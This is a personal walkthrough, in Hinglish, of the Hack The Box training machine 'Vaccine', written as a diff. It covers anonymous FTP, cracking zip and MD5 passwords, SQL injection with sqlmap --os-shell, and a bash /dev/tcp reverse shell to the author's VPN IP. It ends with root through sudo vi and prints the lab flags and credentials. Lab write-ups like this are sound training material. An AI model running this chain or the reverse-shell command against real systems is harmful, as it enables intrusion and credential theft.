@@ -1,0 +1,447 @@
+
+
+HTB_Machine = Vaccine 
+Vaccine_Machine IP = 10.129.126.174
+
+
+1. Besides SSH and HTTP, what other service is hosted on this box? 
+   Ans : ftp
+
+Explanation : 
+
+    > nmap -sC -sV 10.129.126.174
+      
+        Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 17:33 IST
+        Nmap scan report for 10.129.126.174 (10.129.126.174)
+        Host is up (0.14s latency).
+        Not shown: 997 closed tcp ports (conn-refused)
+        PORT   STATE SERVICE VERSION
+        21/tcp open  ftp     vsftpd 3.0.3
+
+2. This service can be configured to allow login with any password for specific username. What is that username? 
+   Ans : anonymous
+   
+Explanation : 
+
+   ftp 10.129.126.174
+    
+        Connected to 10.129.126.174.
+        220 (vsFTPd 3.0.3)
+        Name (10.129.126.174:amulr): anonymous
+        Password:anonymous
+
+3. What is the name of the file downloaded over this service? 
+   Ans : backup.zip 
+
+Explanation : 
+
+ / hum 3rd ans ke liye ab FTP server me jaayenge aur wnha se jo milega usse apne local system me store kr lenge 'get' command use krke 
+
+        ftp> ls
+            200 PORT command successful. Consider using PASV.
+            150 Here comes the directory listing.
+            -rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+            226 Directory send OK.
+            
+        ftp> get backup.zip
+            local: backup.zip remote: backup.zip
+            200 PORT command successful. Consider using PASV.
+            150 Opening BINARY mode data connection for backup.zip (2533 bytes).
+            226 Transfer complete.
+            2533 bytes received in 0.01 secs (360.1678 kB/s)
+        
+        ftp> exit
+
+
+4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? 
+   Ans: zip2john
+
+Explanation : problem ye hai ki jo humne ftp se download kia backup.zip woh password protected hai aur hume password pata nhi hai isliye hum john the ripper se crack krenge
+
+Let's try 
+            unzip backup.zip
+            
+                ┌─[amulr@amul-x540sa]─[~]
+                └──╼ $unzip backup.zip 
+                Archive:  backup.zip
+                [backup.zip] index.php password: 1234
+                password incorrect--reenter: 1234
+                password incorrect--reenter: 1234
+                   skipping: index.php               incorrect password
+                [backup.zip] style.css password: 1234
+                password incorrect--reenter: 1234
+                password incorrect--reenter: 1234
+                   skipping: style.css               incorrect password
+
+See, hume pata hi nhi hai ki password kya mene bas random likha dia 1234 but finally hum crack krenge john the rippers
+
+    .zip file password crack with zip2jhon
+    
+    sudo apt install john 
+
+    After install...
+        
+                ┌─[✗]─[amulr@amul-x540sa]─[~]
+                └──╼ $ zip2john backup.zip > hashes
+                
+                Created directory: /home/amulr/.john
+                ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
+                ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
+                NOTE: It is assumed that all files in each archive have the same password.
+                If that is not the case, the hash may be uncrackable. To avoid this, use
+                option -o to pick a file at a time.
+
+                zip2john   : ye tool hai jo john me aata hai jo zip file protected ko crack krne ke liye hota hai 
+                backup.zip : ye target .zip file hai jisse hum crack krne chahte hai 
+                > hashes   : > ye sign hai ki ek text file aur uska name hoga hashes aur woh ban chuki hai ki nhi hm check krenge 
+                
+                ┌─[amulr@amul-x540sa]─[~]
+                └──╼ $ls -l 
+                total 12
+                -rw-r--r-- 1 amulr amulr 2533 Oct 14 17:42 backup.zip
+                drwxr-xr-x 1 amulr amulr   28 Sep 25 15:46 Desktop
+                drwxr-xr-x 1 amulr amulr    0 Oct 14 14:22 Documents
+                drwxr-xr-x 1 amulr amulr   16 Oct 14 17:17 Downloads
+                -rw-r--r-- 1 amulr amulr 2186 Oct 14 17:58 hashes
+
+       See, woh hashes ki file bann chuki hai ab hum hashes ke zariae password plain text me find karenge
+
+                john= tool for crack passwd & -w = wordlist & hashes = target file jo humne zip2john se nikali
+       
+                ┌─[amulr@amul-x540sa]─[~]
+                └──╼ $  john -w hashes 
+                
+                Using default input encoding: UTF-8
+                Loaded 1 password hash (PKZIP [32/64])
+                Will run 4 OpenMP threads
+                Press 'q' or Ctrl-C to abort, almost any other key for status
+                741852963        (backup.zip)
+                1g 0:00:00:00 DONE (2022-10-14 18:05) 2.380g/s 8442p/s 8442c/s 8442C/s 123456..sss
+                Use the "--show" option to display all of the cracked passwords reliably
+                Session completed
+
+      backup.zip ka passwd mil gya ab hume usse unzip krenge 
+      
+                ┌─[amulr@amul-x540sa]─[~]
+                └──╼ $unzip backup.zip 
+                Archive:  backup.zip
+                [backup.zip] index.php password: 
+                  inflating: index.php               
+                  inflating: style.css 
+    
+                Yeah!! ho gya unzip 
+                
+      Now let's check woh show ho rhi hai ki nhi 
+      
+                ┌─[amulr@amul-x540sa]─[~]
+                └──╼ $ls
+                backup.zip  Desktop  Documents  Downloads  hashes 'index.php' Music  Pictures  Public  'style.css' Templates  Vaccine_HTB  Videos
+
+                hoorayy!!! index.php dikha rha aur style.css bhi dikh rha hai 
+                
+      Now firstly we open index.php 
+      
+                ┌─[amulr@amul-x540sa]─[~]
+                └──╼ $cat index.php
+                <!DOCTYPE html>
+                <?php
+                session_start();
+                  if(isset($_POST['username']) &&       
+                    isset($_POST['password'])) {
+                    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+                      $_SESSION['login'] = "true";
+                      header("Location: dashboard.php");
+                    }
+                  }
+
+      See, "2cb42f8734ea607eefed3b70af13bbd3" looks like hashed 
+      
+      
+      ┌─[amulr@amul-x540sa]─[~]
+      └──╼ $hashid 2cb42f8734ea607eefed3b70af13bbd3
+        Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
+        [+] MD2 
+        [+] MD5 
+        [+] MD4 
+        [+] Double MD5 
+        [+] LM 
+        [+] RIPEMD-128 
+        [+] Haval-128 
+        [+] Tiger-128 
+        [+] Skein-256(128) 
+        [+] Skein-512(128) 
+        [+] Lotus Notes/Domino 5 
+        [+] Skype 
+        [+] Snefru-128 
+        [+] NTLM 
+        [+] Domain Cached Credentials 
+        [+] Domain Cached Credentials 2 
+        [+] DNSSEC(NSEC3) 
+        [+] RAdmin v2.x
+
+    Ye hume bata rha hai ki jo id humne search ki hau woh itne types ki ho skti hai md2 fir md5 fir LM toh aese bhot se type hai hashes ke 
+    
+    
+    
+    > Now, hum 'hashcat' use krke crack krenge plain_text me 
+    
+    Firstly jo hash i'd hai usse hash txt file me store kr do 
+    
+    echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
+    # isse kyaa hoga ki hash name ki ek file banegi aur usme ye i'd hoga
+
+
+5. What is the password for the admin user on the website?
+   Ans : qwerty789 
+
+Note : humne jo echo krke file create ki hai hash name wali uske baad hume jo hashcat ka command use krna hai isliye rockyou.txt wali zarurt padegi but mene dekha ki rockyou.txt zip hai already toh pehle usse unzip krenge uske bad rockyou.txt ko smoothly hum usr kr paayenge 
+
+
+    > UNZIP rockyou.txt
+
+    ┌─[amulr@amul-x540sa]─[~]
+    └──╼ $cd  /usr/share/wordlists/ 
+    
+    ┌─[amulr@amul-x540sa]─[/usr/share/wordlists]
+    └──╼ $ls
+    dirb  dirbuster  dnsmap.txt  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt.gz  wfuzz
+    
+    ┌─[✗]─[amulr@amul-x540sa]─[/usr/share/wordlists]
+    └──╼ $sudo gzip -d rockyou.txt.gz 
+    [sudo] password for amulr: 
+    
+    ┌─[amulr@amul-x540sa]─[/usr/share/wordlists]
+    └──╼ $ls
+    dirb  dirbuster  dnsmap.txt  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt  wfuzz
+    ┌─[amulr@amul-x540sa]─[/usr/share/wordlists]
+    └──╼ $ cd /
+
+
+    > Final step for crack admin password 
+    
+    ┌─[amulr@amul-x540sa]─[~]                                           // janha hash wali create ki th echo use krke wnha path pr jao uske baad niche wala command use kro.
+    └──╼ $hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
+          
+            hashcat (v6.1.1) starting...
+        
+                2cb42f8734ea607eefed3b70af13bbd3:qwerty789 
+                
+                hooray!! mil gya hume admin ka plaintext me passwd 
+                
+6. What option can be passed to sqlmap to try to get command execution via the sql injection?    
+   Ans : --os-shell 
+                
+   > http/10.129.126.174 & hit enter
+   
+        username=admin
+        passwd=qwerty789
+     
+   > mene login kia aur kuch muje table jesa dikha jisme name type fuel jesa ek bada table bana hua hai  
+   
+        > wnha search box me kuch bhi search krenge hum toh upr URL aesa ho jayega 
+            
+            > http://10.129.126.174/dashboard.php?search= 
+        
+        > hume bas ssi URL me kuch add kr dena hai niche ki jese 
+                
+            > http://10.129.126.174/dashboard.php?search=any+query   #ab ye pura URL aage kaam aayegaa hume
+            
+Note : humne dekha kuch table jesa aur usse dekhkr muje laga ki kuch database se related hai toh hum agr database kaa access chahiye yaa sql me kuch vulnerablity hogi toh woh show hogi toh insb chiz ke liye ek tool hai "sqlmap" uske zariae hum kr skte hai. pr sqlmap me hume ip address ke saath saath us website ka cookie bhi chahiye taki humara authentication mil jaaye sql database use krne ka aur cookie hume 2 tarike se mil jaayegi 1. burp-suit use kro aur website ka traffice spider kro aur dusra aasaan tarika hai website ki cookie dekhne ka woh hai >website ke page pr jaakr right-click krke inspect element ko click kro fir pata hi hai niche storage wale tab me jao aapko wnha cookie milega
+
+Website_page> right_click > open inspect_element > Go to storage tab > See name & value
+
+Name : PHPSESSID
+Value: mm4endcds1aqu81k72ovfrob4v
+
+# muje cookie id abhi mili hai current time me agr me fir koi din krunga toh koi aur bhi ho skti hai cookie id always same nhi rahegi isliye jab sql map krna hai website open rkho same time inspect kro storage me jao aur current cookie nikalo 
+
+So finally hume website ka cookie kaa i'd bhi mil gya ab bdhte hai aage sql ko access krne ke liye 
+
+> Applying sqlmap with cookie id :  
+        
+        sqlmap -u 'http://10.129.126.174/dashboard.php?search=any+query' --cookie="PHPSESSID=mm4endcds1aqu81k72ovfrob4v"
+        
+        & hit enter
+        
+        Output :
+        jab bhi puche y or n sirf enter dete rehna
+         
+        hume enter dete jaana hai jab niche wali line hume nhi dikh jaati hume saaf ynha likha hua mila ki search wala jo     
+        parameter hai woh vulnerable hai toh bas ab hum ynha ruk haayenege 
+        'GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]' 
+ 
+> Applying sqlmap again with --os-shell :      
+  # hum ab sidha shell me jana  chahta hai jese teminal ho gya windows ka cmd ho gya toh uske liye os-shell use krna hoga  
+       
+   sqlmap -u 'http://10.129.126.174/dashboard.php?search=any+query' --cookie="PHPSESSID=mm4endcds1aqu81k72ovfrob4v" --os-shell
+   
+   & hit enter
+   
+   Output: 
+   os-shell> 
+   
+> Now we going to original shell with netcat listner method
+
+* YE NICHE WALA COMMAND DENE SE PEHLE AAP APNE LOCAL TERMINAL PR APNA VPN SE MILA HUA IP DEKH LO JO tun0 KRKE HOGA AUR USKE BAAD EK ALAG SE TERMINAL OPEN KRKE "sudo nc -lvnp 443" & HIT ENTER AB NICHE WALA COMMAND DO WOH OS-SHELL ME 
+
+  os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.162/443 0>&1"
+  
+  HIT ENTER
+  
+  Output : 
+  
+  puche Y or N aap enter de do aur jis terminal me aapne nc -lvnp wala run kia tha us terminal me jaao aapko kuch aesa dikhega
+  
+            ┌─[amulr@amul-x540sa]─[~]
+            └──╼ $sudo nc -lvnp 443
+            [sudo] password for amulr: 
+            listening on [any] 443 ...
+            connect to [10.10.14.43] from (UNKNOWN) [10.129.126.174] 38214
+            bash: cannot set terminal process group (6309): Inappropriate ioctl for device
+            bash: no job control in this shell
+            postgres@vaccine:/var/lib/postgresql/11/main$ 
+
+            ------fir aapko niche ki jese command dene wese aapko user flag mil jayega 
+            
+            ------humara user flag is location par hai = /var/lib/postgresql
+            
+            postgres@vaccine:/var/lib/postgresql/11/main$ cd ..
+           
+            postgres@vaccine:/var/lib/postgresql/11$ cd ..
+            
+            postgres@vaccine:/var/lib/postgresql$ ls
+        
+            postgres@vaccine:/var/lib/postgresql$ cat user.txt
+            
+            cat user.txt
+            ec9b13ca4d6229cd5cc1e09980965bf7
+            
+            postgres@vaccine:/var/lib/postgresql$ 
+
+> Ab hum user flag toh mil gya ab chahiye hume root flag toh uske liye hum kyaa krenge hume access bhi privilate user ka toh uske liye hum jaayenge path = /var/www/htm/ & hit enter 
+
+            postgres@vaccine:/var/lib/postgresql$ cd /var/www/html
+            
+            postgres@vaccine:/var/www/html$ ls
+            ls
+            bg.png
+            dashboard.css
+            dashboard.js
+            dashboard.php
+            index.php
+            license.txt
+            style.css
+            
+            postgres@vaccine:/var/www/html$ cat dashboard.php
+            
+            cat dashboard.php
+
+            Output : isme ek bada script milega aur usme aap dekhna aesa likha hua milega user=postgres password=P@s5w0rd!");
+            toh user name postgres mila aur uska password mila 
+    
+  
+User     :   postgres
+password :   P@s5w0rd!
+
+
+
+7. What program can the postgres user run as root using sudo?
+   Ans : vi = means vim editor niche dekho pata chlega 
+            
+> agar dhyan ho toh humne jab nmap se scan kia hume ftp ke saath saath ssh bhi open mila tha kyun naa hum ssh try kre humare 
+  pass ek user postgres ka passwd toh hai hi let's try 
+  
+  
+> SSH login form our local terminal 
+
+        ┌─[amulr@amul-x540sa]─[~]
+        └──╼ $ssh postgres@10.129.126.174
+        The authenticity of host '10.129.126.174 (10.129.126.174)' can't be established.
+        ECDSA key fingerprint is SHA256:eVsQ4RXbKR9eOZaXSlMmyuKTDOQ39NAb4vD+GOegBvk.
+        Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+        Warning: Permanently added '10.129.126.174' (ECDSA) to the list of known hosts.
+        postgres@10.129.126.174's password: 
+        Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
+    
+        postgres@vaccine:~$
+        # chlo access mil gya hume ssh se
+            
+        postgres@vaccine:~$ sudo -l
+        # sudo -l = ka mtlb hau ki jo user hai postgres uske pass kya kya access hai files ka woh hume pata chlega like me agar 
+                    sudo visudo me jaakr user ke samne jo ALL wala use krta hoon usme agar me path de doon sirf apt update wala  
+                    toh woh user sirf apt update hi kr payega baki ke task me jab bhi woh kuch krna chahega uske pass access nhi 
+                    hoga...toh hume niche output me ab postgres user ke baad kya access hai krne ka woh show hoga...
+                    
+    
+        Output :-
+        
+        Matching Defaults entries for postgres on vaccine:
+            env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+        User postgres may run the following commands on vaccine:
+            (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+                
+                
+        See, user ke pass aap dekho pg_hba.conf file ka access hai dekhte hai ye hai kya 
+        
+        postgres@vaccine:~$ sudo vi /etc/postgresql/11/main/pg_hba.conf
+        #must use sudo first after humne us .conf file ko vim editor me open kia hai 
+        
+        > vim editor me kuch yun open hogi puri text file ab vim editor me hume pata hai ki kuch command dena ho toh hum kese 
+          dete hai like muje line number dena ho toh me kuch yun dunga " :set number " toh line numbers aa jayenge fir quit krn 
+          hai toh ":q!" aese krunga kuch changes krke save krna hai toh me ":wq" use krke enter krunga toh file changes wali 
+          save ho jayegi 
+          
+          
+        > thik wese hi hume kuch commands dene hai jisse hume sidha vim editor file se root access mil jaaye ye system ka 
+        
+        Command 1st = :set shell=/bin/sh
+        Command 2nd = :shell
+        
+        > upr wala do command dene ke liye hume sbse pehle keyboard se ye press krna hoga ":" toh vim editor me niche bottom 
+          likhna hai 1st command ye wala ":set shell=/bin/sh" fir enter krna hai wapis ye press krna hai ":" fir wapis 2nd 
+          command dena hai ye wla ":shell" aur enter krna hai toh sidha aap root wale shell me aa jaoge dekho niche 
+        
+                # PostgreSQL Client Authentication Configuration File
+                # ===================================================
+                #
+                # Refer to the "Client Authentication" section in the PostgreSQL
+                # documentation for a complete description of this file.  A short
+                # synopsis follows.
+                #
+                # This file controls: which hosts are allowed to connect, how clients
+                # are authenticated, which PostgreSQL user names they can use, which
+                # databases they can access.  Records take one of these forms:
+                #
+                # local      DATABASE  USER  METHOD  [OPTIONS]
+                # host       DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
+                # hostssl    DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
+                # hostnossl  DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
+                :set shell=/bin/sh  & hit enter
+                :shell & hit enter  
+                
+                >> jese hi upr wale 2 command doge aap niche aese # wala shell open hoga aur woh root ka hoga 
+                
+              
+                # whoami
+                root
+                # cd /root
+                # ls
+                pg_hba.conf  root.txt  snap
+                # cat root.txt	
+                dd6e058e814260bc70e9bbdef2715849
+                
+                
+                >> Yeah!! mil gya root flag hi hmko ab naacho....
+
+
+ user_flag : ec9b13ca4d6229cd5cc1e09980965bf7
+ root_flag : dd6e058e814260bc70e9bbdef2715849      
+
+        
+Most Important:-
+
+Check this link : https://gtfobins.github.io/gtfobins/vi/
+
+--humne :set shell=/bin/sh & :shell command toh use kie par kyun hum uske through root me jaa paye sidha toh kya logic tha woh sb upr wali link me mil jaayega thoda padho aur thoda dhyaan do 
